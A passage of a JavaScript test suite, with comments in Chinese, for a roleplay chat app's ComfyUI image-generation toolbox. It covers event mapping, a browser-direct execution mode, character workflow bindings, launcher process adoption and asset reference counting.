  assert.equal(queue.pending, 2);
  assert.equal(queue.total, 3);
  assert.deepEqual(queue.items.map((item) => item.promptId), ['pid-1', 'pid-2', 'pid-3']);
  assert.equal(queue.items[0].state, 'running');

  // 事件名与字段对着 ComfyUI 源码核过（server.py / execution.py / progress.py）
  assert.equal(mapComfyEvent({ type: 'status', data: { status: { exec_info: { queue_remaining: 4 } } } }).queueRemaining, 4);
  assert.equal(mapComfyEvent({ type: 'execution_start', data: { prompt_id: 'p1' } }).state, 'running');
  const executing = mapComfyEvent({ type: 'executing', data: { node: '7', display_node: '7', prompt_id: 'p1' } });
  assert.equal(executing.nodeId, '7');
  assert.equal(executing.state, 'running');
  assert.equal(mapComfyEvent({ type: 'executing', data: { node: null, prompt_id: 'p1' } }).state, 'finishing');
  const progress = mapComfyEvent({ type: 'progress', data: { value: 5, max: 20, node: '3', prompt_id: 'p1' } });
  assert.equal(progress.value, 5);
  assert.equal(progress.max, 20);
  const state = mapComfyEvent({ type: 'progress_state', data: { prompt_id: 'p1', nodes: { 3: { value: 9, max: 20, state: 'running', node_id: '3' } } } });
  assert.equal(state.value, 9);
  const failed = mapComfyEvent({ type: 'execution_error', data: { prompt_id: 'p1', node_id: '3', exception_type: 'RuntimeError', exception_message: 'CUDA out of memory' } });
  assert.equal(failed.state, 'error');
  assert.match(failed.error, /CUDA out of memory/);
  assert.equal(mapComfyEvent({ type: 'execution_success', data: { prompt_id: 'p1' } }).state, 'success');

  const images = collectHistoryImages({ outputs: { '9': { images: [{ filename: 'a.png', subfolder: '', type: 'output' }] }, '10': { images: [{ filename: 'b.png', subfolder: 'x', type: 'temp' }] } } });
  assert.equal(images.length, 2);
  assert.equal(images[1].subfolder, 'x');
  assert.equal(historyStatus({ status: { status_str: 'success' } }).status, 'done');
  assert.match(historyStatus({ status: { status_str: 'error', messages: [['execution_error', { exception_message: 'BOOM' }]] } }).error, /BOOM/);
  assert.equal(progressPercent({ progress: 5, progressMax: 20 }), 25);
  assert.equal(progressPercent({ progress: 5, progressMax: 0 }), null);
});

test('工具箱：连不上 ComfyUI 时给的是人话', () => {
  assert.equal(normaliseBaseUrl('  http://host:8188///  '), 'http://host:8188');
  assert.equal(normaliseBaseUrl(''), 'http://127.0.0.1:8188');
  assert.match(describeFetchError({ cause: { code: 'ECONNREFUSED' } }, 'http://127.0.0.1:8188', 5000), /端口没人监听/);
  assert.match(describeFetchError({ name: 'TimeoutError' }, 'http://x:8188', 5000), /超时/);
  assert.match(describeFetchError({ cause: { code: 'ENOTFOUND' } }, 'http://nope:8188', 5000), /主机名/);
  const message = comfyErrorMessage(400, JSON.stringify({ error: { type: 'prompt_outputs_failed_validation', message: 'Prompt outputs failed validation' }, node_errors: { '3': { errors: [{ message: 'seed 必须是整数' }] } } }), '/prompt');
  assert.match(message, /HTTP 400/);
  assert.match(message, /seed 必须是整数/);
});

test('工具箱：连接方式 —— 浏览器直连的地址推导与终态判断', () => {
  assert.deepEqual(COMFY_EXECUTION_MODES.map((item) => item.id), ['server', 'client']);
  assert.equal(getComfyExecutionMode('client').id, 'client');
  assert.equal(getComfyExecutionMode('不认识').id, 'server', '不认识的值退回 server');

  // WebSocket 地址由 http(s) 推导：http→ws、https→wss
  assert.equal(comfyWsUrl('http://127.0.0.1:8188', 'abc'), 'ws://127.0.0.1:8188/ws?clientId=abc');
  assert.equal(comfyWsUrl('https://comfy.example.com/', 'x y'), 'wss://comfy.example.com/ws?clientId=x%20y');

  assert.equal(isComfyTerminal('done'), true);
  assert.equal(isComfyTerminal('cancelled'), true);
  assert.equal(isComfyTerminal('running'), false);
  assert.equal(isComfyTerminal('pending-client'), false, '待办不是终态，还要等浏览器来领');
});

test('工具箱：浏览器直连（client 模式）—— 主机不出请求、触发落成待办、前端回写', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createComfyStore({ repo: db.repo });
    let hostCalls = 0;
    const runnerPort = {
      submit: async () => {
        hostCalls += 1;
        return { id: 'x', status: 'queued' };
      },
      test: async () => {
        hostCalls += 1;
        return { ok: true };
      },
      queue: async () => {
        hostCalls += 1;
        return { running: 1, pending: 0, total: 1, items: [] };
      },
      cancel: async () => {
        hostCalls += 1;
        return { ok: true };
      },
    };
    // 地址故意填一个"主机不该碰"的内网地址：client 模式下主机一次都不许发请求。
    const live = { 'comfy.enabled': true, 'comfy.trigger': 'marker', 'comfy.baseUrl': 'http://10.0.0.5:8188', 'comfy.executionMode': 'client' };
    const { comfy } = createToolboxServices({ settings: live, ports: { comfyStore: store, comfyRunner: runnerPort, getSettings: () => live } });
    const workflow = comfy.importWorkflow({ name: '立绘', kind: 'portrait', workflow: COMFY_SAMPLE, seed: 4242 });

    assert.equal(comfy.executionMode(), 'client');
    const st = await comfy.status();
    assert.equal(st.executionMode, 'client');
    assert.equal(st.ok, null, 'client 模式下主机不探活');
    assert.equal(st.client, true);
    const test = await comfy.test();
    assert.equal(test.ok, null);
    assert.equal(test.client, true);
    assert.equal((await comfy.queue()).client, true);
    await assert.rejects(() => comfy.run({ workflowId: workflow.id }), /浏览器直连/);
    assert.equal(hostCalls, 0, 'client 模式下主机不能向用户地址发任何请求（SSRF 收敛）');

    // 触发（marker / 场景变化）→ 落成 pending-client 待办；最终 prompt 服务端已经算好
    const fired = await comfy.triggerForMessage({ chatId: 'chat-1', messageId: 'msg-1', memberName: '琥珀', content: '她抬头。[IMG: portrait: 白狐，雪夜]' });
    assert.equal(fired.trigger, true);
    assert.equal(fired.started[0].ok, true);
    assert.equal(fired.started[0].pending, true);
    const pending = comfy.runs({ status: 'pending-client' }).items;
    assert.equal(pending.length, 1);
    assert.equal(pending[0].messageId, 'msg-1');
    assert.match(pending[0].values.prompt['6'].inputs.text, /白狐，雪夜/);
    assert.equal(pending[0].values.prompt['3'].inputs.seed, 4242, '固定种子要带进待办');
    assert.equal((await comfy.status()).pendingClient, 1);

    // 前端领走：登记 promptId → running；回写进度与完成图片
    const claimed = comfy.registerClientRun({ runId: pending[0].id, promptId: 'pid-abc', workflowId: workflow.id });
    assert.equal(claimed.status, 'running');
    assert.equal(claimed.promptId, 'pid-abc');
    const running = comfy.updateClientRun(pending[0].id, { progress: 3, progressMax: 10, nodeId: '5' });
    assert.equal(running.percent, 30);
    const finished = comfy.updateClientRun(pending[0].id, { status: 'done', images: [{ assetId: 'ast_1', filename: 'a.png' }] });
    assert.equal(finished.status, 'done');
    assert.equal(finished.images[0].assetId, 'ast_1');
    assert.equal(finished.percent, 100, '跑完直接满格');
    assert.equal(comfy.pendingClientCount(), 0);
    assert.equal(hostCalls, 0);
  } finally {
    cleanup();
  }
});

test('提示词：输出后处理正则链（AI_OUTPUT 改内容 + 只改显示）', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const models = {
      async *chat() {
        yield { type: 'text', text: '她笑了。\n[内部]这句要删掉\n```state\n{"place":"教堂"}\n```' };
      },
      async complete() {
        return { text: 'ok' };
      },
    };
    const { chat, state } = createPlayingServices({
      settings: {},
      ports: {
        chatStore: store,
        models,
        resolveBinding: () => ({ providerId: 'p1', model: 'mock', params: {}, source: 'default' }),
        providerParams: () => ({}),
      },
    });
    const created = await chat.create({ title: '正则', character: { name: '阿狸', first_mes: '喵。' } });
    await chat.update(created.id, {
      settings: {
        regexScripts: [
          { id: 'r1', scriptName: '去内部注释', findRegex: '/\\[内部\\][^\\n]*\\n?/', replaceString: '', placement: [2] },
          { id: 'r2', scriptName: '只改显示', findRegex: '/她笑了。/', replaceString: '她笑得很开心。', placement: [2], markdownOnly: true },
        ],
      },
    });
    const events = [];
    for await (const event of chat.send(created.id, { text: '笑一个' })) events.push(event);
    const done = events.find((event) => event.type === 'done');
    assert.ok(done);
    const message = (await chat.messages(created.id)).items.at(-1);
    assert.equal(message.content, '她笑了。', '提示词用的正文要过 AI_OUTPUT 正则（注释被删）');
    assert.ok(!message.content.includes('内部'));
    assert.equal(message.extra.displayContent, '她笑得很开心。', '只改显示的脚本结果放进 displayContent');
    // 状态块照旧解析
    assert.equal((await state.get(created.id)).worldState.place, '教堂');
  } finally {
    cleanup();
  }
});

test('工具箱加分项：批量表情、参考图标记、角色绑定与 LoRA', async () => {
  // 表情清单与批量计划
  assert.ok(listExpressions().some((item) => item.id === 'happy'));
  const plan = planExpressionBatch({ emotions: ['happy', 'sad', 'happy'], baseText: 'masterpiece' });
  assert.deepEqual(plan.map((item) => item.emotion), ['happy', 'sad'], '去重且保序');
  assert.match(plan[0].text, /masterpiece/);
  assert.match(plan[0].text, /smiling/);
  assert.equal(planExpressionBatch({}).length, 4, '默认开心 / 难过 / 生气 / 害羞');

  // 参考图标记：prompt 里存 asset:<id>，执行方上传后替换成文件名
  const prompt = { 8: { class_type: 'LoadImage', inputs: { image: makeAssetRef('ast_ref'), upload: 'image' } } };
  const refs = collectAssetRefs(prompt);
  assert.equal(refs.length, 1);
  assert.equal(refs[0].assetId, 'ast_ref');
  assert.deepEqual(refs[0].path, ['8', 'inputs', 'image']);
  applyAssetRefs(prompt, { ast_ref: 'uploaded.png' });
  assert.equal(prompt['8'].inputs.image, 'uploaded.png');
  assert.equal(isAssetRef('asset:x'), true);
  assert.equal(isAssetRef('nope'), false);

  // 导入时把 LoadImage.image 标成 image 类型
  const binds = suggestBindings({ 8: { class_type: 'LoadImage', inputs: { image: 'example.png', upload: 'image' } }, 6: { class_type: 'CLIPTextEncode', inputs: { text: 'x' } } });
  assert.equal(binds.find((item) => item.nodeId === '8').type, 'image');
  assert.ok(getWorkflowPreset('preset-img2img').workflow['8']);
  assert.ok(getWorkflowPreset('preset-outpaint').workflow['9']);
  const img2imgPrompt = parseApiWorkflow(getWorkflowPreset('preset-img2img').workflow).prompt;
  assert.ok(suggestBindings(img2imgPrompt).some((item) => item.type === 'image'), '示例工作流的 LoadImage 要能认出来');

  const { db, cleanup } = makeTempDb();
  try {
    const store = createComfyStore({ repo: db.repo });
    db.repo.run('INSERT INTO characters (id, name, spec_version, data, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)', [
      'char-1', '阿狸', 'v2', '{}', '2026-10-03T00:00:00Z', '2026-10-03T00:00:00Z',
    ]);
    const submitted = [];
    const runnerPort = {
      submit: async (input) => {
        submitted.push(input);
        return { id: `run-${submitted.length}`, status: 'queued', workflowId: input.workflowId, promptId: `pid-${submitted.length}` };
      },
      test: async () => ({ ok: true }),
      queue: async () => ({ running: 0, pending: 0, total: 0, items: [] }),
      cancel: async () => ({ ok: true }),
    };
    const live = { 'comfy.enabled': true, 'comfy.trigger': 'marker', 'comfy.baseUrl': 'http://127.0.0.1:8188', 'comfy.executionMode': 'server' };
    const { comfy } = createToolboxServices({ settings: live, ports: { comfyStore: store, comfyRunner: runnerPort, getSettings: () => live } });
    const portrait = comfy.importWorkflow({ name: '立绘', kind: 'portrait', workflow: COMFY_SAMPLE, seed: 1 });
    const img2img = comfy.importPreset('preset-img2img', { name: '图生图' });

    // 角色绑定：工作流 + LoRA + 表情包
    const saved = comfy.saveCharacterBinding('char-1', { workflowId: portrait.id, loraText: '<lora:alice:0.8>', expressions: { 开心: 'ast_happy' } });
    assert.equal(saved.workflowId, portrait.id);
    assert.equal(saved.loraText, '<lora:alice:0.8>');
    assert.deepEqual(comfy.getCharacterBinding('char-1').expressions, { 开心: 'ast_happy' });
    assert.equal(comfy.expressionAssetFor({ characterId: 'char-1', emotion: '开心' }).assetId, 'ast_happy');
    assert.equal(comfy.expressionAssetFor({ characterId: 'char-1', emotion: 'happy' }).assetId, 'ast_happy', '用表情 id 也能找到');
    assert.equal(comfy.expressionAssetFor({ characterId: 'char-1', emotion: '生气' }), null, '没绑的表情找不到');
    assert.equal(comfy.workflowForCharacter('char-1').id, portrait.id);

    // 触发：用角色绑定的工作流，并把 LoRA 触发词接到提示词后面
    const fired = await comfy.triggerForMessage({ chatId: 'chat-1', messageId: 'msg-1', characterId: 'char-1', content: '她笑了。[IMG: 微笑]' });
    assert.equal(fired.trigger, true);
    assert.equal(fired.started[0].ok, true);
    assert.equal(submitted.at(-1).workflowId, portrait.id);
    assert.match(submitted.at(-1).prompt['6'].inputs.text, /<lora:alice:0.8>/);
    assert.match(submitted.at(-1).prompt['6'].inputs.text, /微笑/);

    // 工作流里还有 CLIPLoader 这种"模型文件名也是文本"的输入时，场景描述不能接到它上面。
    // （CLIPLoader.clip_name 也匹配 /clip/，老写法会挑错节点）
    const withLoader = comfy.importWorkflow({
      name: '带 CLIPLoader',
      kind: 'portrait',
      workflow: {
        1: { class_type: 'CLIPLoader', inputs: { clip_name: 'qwen_3_06b_base.safetensors', type: 'stable_diffusion' } },
        2: { class_type: 'UNETLoader', inputs: { unet_name: 'anima.safetensors' } },
        3: { class_type: 'KSampler', inputs: { seed: 1, steps: 20, cfg: 5, denoise: 1, model: ['2', 0], positive: ['4', 0], negative: ['5', 0] } },
        4: { class_type: 'CLIPTextEncode', inputs: { text: 'artist:noyu, 1girl', clip: ['1', 0] } },
        5: { class_type: 'CLIPTextEncode', inputs: { text: 'lowres, bad anatomy', clip: ['1', 0] } },
      },
    });
    assert.ok(withLoader.bindings.some((binding) => binding.input === 'clip_name'), '这个输入确实会被当成可填文本');
    comfy.saveCharacterBinding('char-1', { workflowId: withLoader.id, loraText: null, expressions: {} });
    await comfy.triggerForMessage({ chatId: 'chat-1', messageId: 'msg-2', characterId: 'char-1', content: '再来一张。[IMG: 雨夜街头]' });
    const withLoaderPrompt = submitted.at(-1).prompt;
    assert.equal(withLoaderPrompt['1'].inputs.clip_name, 'qwen_3_06b_base.safetensors', '模型文件名不能被改');
    assert.match(withLoaderPrompt['4'].inputs.text, /雨夜街头/, '场景描述要接在正向提示词上');
    assert.match(withLoaderPrompt['4'].inputs.text, /artist:noyu/, '工作流自己的提示词要留着');
    assert.equal(withLoaderPrompt['5'].inputs.text, 'lowres, bad anatomy', '负向提示词不该被动');

    // 参考图：值变成 asset: 标记，交给执行方上传
    const ref = await comfy.runWithReference({ workflowId: img2img.id, referenceAssetId: 'ast_ref', chatId: 'chat-1' });
    assert.equal(ref.status, 'queued');
    assert.equal(submitted.at(-1).prompt['8'].inputs.image, 'asset:ast_ref');
    assert.equal(submitted.at(-1).prompt['5'].inputs.denoise, 0.6);
    // 没有参考图输入的工作流要给人话
    await assert.rejects(() => comfy.runWithReference({ workflowId: portrait.id, referenceAssetId: 'ast_ref' }), /参考图输入/);

    // client 模式：批量表情落成待办
    const clientLive = { ...live, 'comfy.executionMode': 'client' };
    const client = createToolboxServices({ settings: clientLive, ports: { comfyStore: store, comfyRunner: runnerPort, getSettings: () => clientLive } }).comfy;
    const batch = await client.runBatchExpressions({ workflowId: portrait.id, emotions: ['happy', 'angry'], chatId: 'chat-1', messageId: 'msg-1' });
    assert.equal(batch.items.length, 2);
    assert.ok(batch.items.every((item) => item.ok && item.run.status === 'pending-client'));
    assert.match(batch.items[0].run.values.prompt['6'].inputs.text, /smiling/);
    assert.match(batch.items[1].run.values.prompt['6'].inputs.text, /frowning/);

    assert.equal(comfy.listCharacterBindings().total, 1);
    assert.equal(comfy.removeCharacterBinding('char-1'), true);
    assert.equal(comfy.getCharacterBinding('char-1'), null);
  } finally {
    cleanup();
  }
});

test('工具箱：ComfyUI 启动托管的参数切分与规格计算', () => {
  // 参数切分：空格分隔，引号里的空格不切（Windows 路径常带空格）
  assert.deepEqual(parseLaunchArgs('main.py --listen 127.0.0.1 --port 8188'), ['main.py', '--listen', '127.0.0.1', '--port', '8188']);
  assert.deepEqual(parseLaunchArgs('"C:\\Program Files\\x\\python.exe" main.py'), ['C:\\Program Files\\x\\python.exe', 'main.py']);
  assert.deepEqual(parseLaunchArgs("  a   b  "), ['a', 'b']);
  assert.deepEqual(parseLaunchArgs(''), []);
  assert.deepEqual(parseLaunchArgs(null), []);

  // 端口不单独配：跟着 comfy.baseUrl 走，免得探活地址和启动参数打架
  const spec = comfyLaunchSpec({
    'comfy.baseUrl': 'http://127.0.0.1:8199',
    'comfy.launcher.command': '  E:\\pkg\\python\\python.exe  ',
    'comfy.launcher.args': 'main.py --port 8199 --disable-auto-launch',
    'comfy.launcher.cwd': ' E:\\pkg\\ComfyUI ',
    'comfy.autoStart': true,
    'comfy.idleStopMinutes': 0,
  });
  assert.equal(spec.configured, true);
  assert.equal(spec.command, 'E:\\pkg\\python\\python.exe', '命令要去掉首尾空格');
  assert.equal(spec.cwd, 'E:\\pkg\\ComfyUI');
  assert.equal(spec.port, 8199);
  assert.equal(spec.host, '127.0.0.1');
  assert.equal(spec.autoStart, true);
  assert.equal(spec.idleStopMinutes, 0, '0 就是"不停"');
  assert.equal(spec.args.includes('--disable-auto-launch'), true);

  // 没配命令 = 不托管；地址歪了也别抛，退回默认端口
  const off = comfyLaunchSpec({});
  assert.equal(off.configured, false);
  assert.equal(off.port, 8188, '默认按 127.0.0.1:8188 算');
  assert.equal(off.autoStart, false);
  assert.equal(off.idleStopMinutes, 15, '默认闲置 15 分钟自动停');
  assert.equal(comfyLaunchSpec({ 'comfy.baseUrl': '不是地址' }).port, 8188);
  assert.equal(comfyLaunchSpec({ 'comfy.idleStopMinutes': -3 }).idleStopMinutes, 0);
});

test('工具箱：托管启动能认回"上次酒馆留下的" ComfyUI', async () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'st-launch-'));
  const stateFile = path.join(dir, 'comfy-launcher.json');
  const alive = (pid) => {
    try {
      process.kill(pid, 0);
      return true;
    } catch {
      return false;
    }
  };
  const quiet = { info() {}, warn() {}, error() {}, debug() {} };
  // 酒馆窗口被直接关掉时，它拉起来的 ComfyUI 会留在后台 —— 这里用一个长命进程扮演它
  const leftover = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)'], { stdio: 'ignore' });
  let adoptedLauncher = null;
  try {
    writeFileSync(stateFile, JSON.stringify({ pid: leftover.pid, port: 8188, startedAt: new Date().toISOString() }), 'utf8');
    adoptedLauncher = createComfyLauncher({
      logger: quiet,
      stateFile,
      getSettings: () => ({ 'comfy.launcher.command': process.execPath, 'comfy.launcher.args': '-e 1', 'comfy.idleStopMinutes': 0 }),
    });
    assert.equal(adoptedLauncher.swept.adopted, true, '活着就该接管');
    const status = adoptedLauncher.status();
    assert.equal(status.running, true);
    assert.equal(status.adopted, true);
    assert.equal(status.pid, leftover.pid);
    // 接管来的也算"自己的"：停掉它 + 把记录清掉（不然下次还会去认一个已经不存在的 PID）
    assert.equal(adoptedLauncher.stop('测试'), true);
    await new Promise((resolve) => setTimeout(resolve, 800));
    assert.equal(alive(leftover.pid), false, '接管来的进程要真被收掉');
    assert.equal(existsSync(stateFile), false, '记录要清掉');

    // 记录里的 PID 已经死了：认不回来，顺手把过期记录清掉
    writeFileSync(stateFile, JSON.stringify({ pid: leftover.pid, port: 8188 }), 'utf8');
    const second = createComfyLauncher({ logger: quiet, stateFile, getSettings: () => ({ 'comfy.idleStopMinutes': 0 }) });
    assert.equal(second.swept.adopted, false);
    assert.equal(existsSync(stateFile), false, '死掉的记录不该留着');
    assert.equal(second.status().running, false);
  } finally {
    try {
      leftover.kill('SIGKILL');
    } catch {}
    rmSync(dir, { recursive: true, force: true });
  }
});

test('工具箱：正负提示词定位与删图清理', () => {
  // 顺着 KSampler 的 positive / negative 找文本编码器；中间夹一层 ConditioningCombine 也要穿过去
  const prompt = {
    3: { class_type: 'KSampler', inputs: { positive: ['10', 0], negative: ['7', 0] } },
    10: { class_type: 'ConditioningCombine', inputs: { conditioning_1: ['6', 0], conditioning_2: ['11', 0] } },
    6: { class_type: 'CLIPTextEncode', inputs: { text: '一只猫' } },
    11: { class_type: 'CLIPTextEncode', inputs: { text: '背景' } },
    7: { class_type: 'CLIPTextEncode', inputs: { text: 'lowres' } },
  };
  const slots = detectPromptSlots(prompt);
  assert.equal(slots.positive.nodeId, '6');
  assert.equal(slots.positive.value, '一只猫');
  assert.equal(slots.positive.input, 'text');
  assert.equal(slots.negative.nodeId, '7');
  assert.equal(slots.negative.value, 'lowres');
  // 只有 conditioning 的 Guider（SamplerCustom 那类）：当正向处理
  const guider = detectPromptSlots({
    1: { class_type: 'BasicGuider', inputs: { conditioning: ['6', 0] } },
    6: { class_type: 'CLIPTextEncode', inputs: { text: 'x' } },
  });
  assert.equal(guider.positive.nodeId, '6');
  assert.equal(guider.negative, null);
  // 认不出来就是 null，别抛错
  assert.equal(detectPromptSlots({ 1: { class_type: 'VAEDecode', inputs: {} } }).positive, null);
  assert.deepEqual(detectPromptSlots({}), { positive: null, negative: null });
  assert.deepEqual(detectPromptSlots(null), { positive: null, negative: null });

  const { db, cleanup } = makeTempDb();
  try {
    // 删图：出图记录里的引用摘掉；摘完一张不剩的那种空壳记录要被清掉，还有图的留着
    const store = createComfyStore({ repo: db.repo });
    const first = store.insertRun({
      workflowId: 'w1',
      workflowName: '立绘',
      status: 'done',
      images: [{ assetId: 'ast_1', filename: 'a.png' }, { assetId: 'ast_2', filename: 'b.png' }],
    });
    const second = store.insertRun({ workflowId: 'w1', workflowName: '立绘', status: 'done', images: [{ assetId: 'ast_3' }] });
    assert.deepEqual(store.detachImage('ast_1'), [first.id]);
    assert.deepEqual(store.getRun(first.id).images.map((item) => item.assetId), ['ast_2']);
    assert.equal(store.getRun(first.id).status, 'done', '记录状态不该被动');
    assert.equal(store.pruneEmptyRuns([first.id]), 0, '还有一张图，记录要留着');
    assert.ok(store.getRun(first.id));
    assert.deepEqual(store.detachImage('ast_2'), [first.id]);
    assert.equal(store.pruneEmptyRuns([first.id]), 1, '一张图都不剩就整条清掉');
    assert.equal(store.getRun(first.id), null);
    assert.deepEqual(store.getRun(second.id).images.map((item) => item.assetId), ['ast_3'], '没引用它的记录不碰');
    assert.deepEqual(store.detachImage('ast_9'), [], '没人引用就返回空');
    assert.deepEqual(store.detachImage(''), []);
    assert.equal(store.pruneEmptyRuns(['跑不存在的 id']), 0, '不存在的记录不算数');

    // 消息附件：id 字符串和 { assetId } 对象两种写法都认，只动引用到它的那条消息
    const chats = createChatStore({ repo: db.repo });
    const chat = chats.createChat({ title: '删图', character: { name: '阿狸' } });
    const hit = chats.appendMessage(chat.id, { role: 'assistant', content: 'a', extra: { images: ['ast_1', { assetId: 'ast_2' }] } });
    const miss = chats.appendMessage(chat.id, { role: 'assistant', content: 'b', extra: { images: ['ast_3'] } });
    assert.equal(detachAssetRefs(db.repo, 'ast_1'), 1);
    assert.deepEqual(chats.getMessage(chat.id, hit.id).extra.images, [{ assetId: 'ast_2' }]);
    assert.deepEqual(chats.getMessage(chat.id, miss.id).extra.images, ['ast_3']);
    assert.equal(detachAssetRefs(db.repo, 'ast_1'), 0, '已经摘干净了再摘一次是 0');
    assert.equal(detachAssetRefs(db.repo, ''), 0);
  } finally {
    cleanup();
  }
});

test('工具箱：出图服务（假 ComfyUI 端口）跑通导入 → 预览 → 提交', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createComfyStore({ repo: db.repo });
    const submitted = [];
    const runnerPort = {
      submit: async (input) => {
        submitted.push(input);
        return { id: `run-${submitted.length}`, status: 'queued', workflowId: input.workflowId, chatId: input.chatId ?? null, promptId: `pid-${submitted.length}` };
      },
      test: async () => ({ ok: true, stats: { comfyuiVersion: 'test' } }),
      queue: async () => ({ running: 0, pending: 0, total: 0, items: [] }),
      cancel: async () => ({ ok: true }),
    };
    const live = { 'comfy.enabled': true, 'comfy.trigger': 'marker', 'comfy.baseUrl': 'http://127.0.0.1:8188' };
    const { comfy } = createToolboxServices({ settings: live, ports: { comfyStore: store, comfyRunner: runnerPort, getSettings: () => live } });

    const workflow = comfy.importWorkflow({ name: '立绘', kind: 'portrait', workflow: COMFY_SAMPLE, seed: 4242 });
    assert.equal(workflow.kind, 'portrait');
    assert.ok(workflow.bindings.length >= 8);
    assert.deepEqual(workflow.placeholders, ['char', 'scene', 'emotion']);
    assert.equal(comfy.listWorkflows({}).total, 1);
    assert.equal(comfy.inputs(workflow.id).total, 11);

    const context = { char: '琥珀', scene: '酒馆 · 夜', emotion: '害羞' };
    const preview = comfy.preview({ workflowId: workflow.id, context, values: { '5.height': 1024 } });
    assert.match(preview.prompt['6'].inputs.text, /琥珀/);
    assert.equal(preview.prompt['5'].inputs.height, 1024);
    assert.equal(preview.prompt['3'].inputs.seed, 4242, '工作流上固定的种子要生效');

    const run = await comfy.run({ workflowId: workflow.id, chatId: 'chat-1', messageId: 'msg-1', context });
    assert.equal(run.status, 'queued');
    assert.equal(submitted.length, 1);
    assert.equal(submitted[0].chatId, 'chat-1');
    assert.equal(submitted[0].prompt['3'].inputs.seed, 4242);

    // marker 模式：回复里带 [IMG: ...] 才提交
    const quiet = await comfy.triggerForMessage({ chatId: 'chat-1', content: '什么都没有' });
    assert.equal(quiet.trigger, false);
    const fired = await comfy.triggerForMessage({ chatId: 'chat-1', messageId: 'msg-1', content: '她抬头。[IMG: portrait: 白狐，雪夜]' });
    assert.equal(fired.trigger, true);
    assert.equal(fired.started[0].ok, true);
    assert.equal(submitted.length, 2);
    assert.match(submitted[1].prompt['6'].inputs.text, /白狐，雪夜/);
    assert.equal(submitted[1].messageId, 'msg-1');

    // 没启用时不出图，且给的是可读原因
    const off = createToolboxServices({ settings: { ...live, 'comfy.enabled': false }, ports: { comfyStore: store, comfyRunner: runnerPort } });
    assert.deepEqual(
      { trigger: (await off.comfy.triggerForMessage({ chatId: 'chat-1', content: '[IMG: x]' })).trigger },
      { trigger: false },
    );

    assert.equal(comfy.saveWorkflow(workflow.id, { name: '立绘 v2' }).name, '立绘 v2');
    assert.equal(comfy.removeWorkflow(workflow.id), true);
    assert.equal(comfy.listWorkflows({}).total, 0);
  } finally {
    cleanup();
  }
});

test('素材库：引用计数把消息 / 出图记录 / 角色头像都算上', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const assets = createAssetStore({ repo: db.repo, dataDir: dir });
    const a1 = assets.save({ buffer: Buffer.from('png-1'), mime: 'image/png', name: 'a.png' });
    const a2 = assets.save({ buffer: Buffer.from('png-2'), mime: 'image/png', name: 'b.png' });

    const chats = createChatStore({ repo: db.repo });
    const chat = chats.createChat({ title: '引用计数' });
    chats.appendMessage(chat.id, { role: 'assistant', content: '看图', extra: { images: [a1.id, { assetId: a2.id }] } });
    db.repo.run('INSERT INTO comfy_runs (id, status, params, images, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)', [
      'run-ref', 'done', '{}', JSON.stringify([{ assetId: a1.id }]), '2026-10-03T00:00:00Z', '2026-10-03T00:00:00Z',
    ]);
    db.repo.run('INSERT INTO characters (id, name, spec_version, data, avatar_asset_id, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)', [
      'char-ref', '阿狸', 'v2', '{}', a2.id, '2026-10-03T00:00:00Z', '2026-10-03T00:00:00Z',
    ]);

    const counts = assets.usageCounts();
    assert.equal(counts[a1.id], 2, '一条消息 + 一条出图记录');
    assert.equal(counts[a2.id], 2, '一条消息 + 角色头像');
    assert.equal(assets.get(a1.id).refCount, 2);
    assert.equal(assets.list({ limit: 10 }).find((item) => item.id === a2.id).refCount, 2);
    assert.equal(assets.get(a1.id).refCount, 2);
    // 没人引用的素材是 0
    const a3 = assets.save({ buffer: Buffer.from('png-3'), mime: 'image/png', name: 'c.png' });
    assert.equal(assets.get(a3.id).refCount, 0);
  } finally {
    cleanup();
  }
});

test('工具箱：出图执行器把 history 里的图落进素材库并绑回消息', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const store = createComfyStore({ repo: db.repo });
    const assets = createAssetStore({ repo: db.repo, dataDir: dir });
    const attached = [];
    const client = {
      history: async () => ({
        outputs: { '9': { images: [{ filename: 'tavern_0001.png', subfolder: '', type: 'output' }] } },
        status: { status_str: 'success' },
      }),
      fetchImage: async () => ({ buffer: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), mime: 'image/png' }),
      queue: async () => ({ running: 0, pending: 0, total: 0, items: [] }),
    };
    const runner = createComfyRunner({
      store,
      assets,
      getConfig: () => ({ baseUrl: 'http://127.0.0.1:9', enabled: false, timeoutMs: 500 }),
      attachImages: (info) => attached.push(info),
      createClient: () => client,
      logger: silentLogger,
    });

    const run = store.insertRun({ workflowId: 'wf', workflowName: '立绘', chatId: 'chat-1', messageId: 'msg-9', promptId: 'pid-9', status: 'queued' });
    const done = await runner.refreshRun(run.id);
    assert.equal(done.status, 'done');
    assert.equal(done.images.length, 1);
    assert.ok(assets.get(done.images[0].assetId), '图片要真的进素材库');
    assert.equal(attached.length, 1);
    assert.equal(attached[0].messageId, 'msg-9');
    assert.equal(assets.stats().total, 1);
    runner.stop();

    // 同样的字节再存一次：按内容哈希去重
    const again = assets.save({ buffer: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), mime: 'image/png' });
    assert.equal(again.id, done.images[0].assetId);
    assert.equal(assets.stats().total, 1);

    // 执行失败要落到 run.error 上，并让人看懂
    const failing = createComfyRunner({
      store,
      assets,
      getConfig: () => ({ baseUrl: 'http://127.0.0.1:9', enabled: false, timeoutMs: 500 }),
      createClient: () => ({
        history: async () => ({ outputs: {}, status: { status_str: 'error', messages: [['execution_error', { exception_message: 'CUDA out of memory' }]] } }),
        queue: async () => ({ running: 0, pending: 0, total: 0, items: [] }),
      }),
      logger: silentLogger,
    });
    const bad = store.insertRun({ workflowId: 'wf', promptId: 'pid-bad', status: 'queued' });
    const failed = await failing.refreshRun(bad.id);
    assert.equal(failed.status, 'error');
    assert.match(failed.error, /CUDA out of memory/);
    failing.stop();
  } finally {
    cleanup();
  }
});

// ---------------------------------------------------------------- 工具箱 3.2 花费

test('工具箱：用量归一化、缓存节省、预估对比', () => {
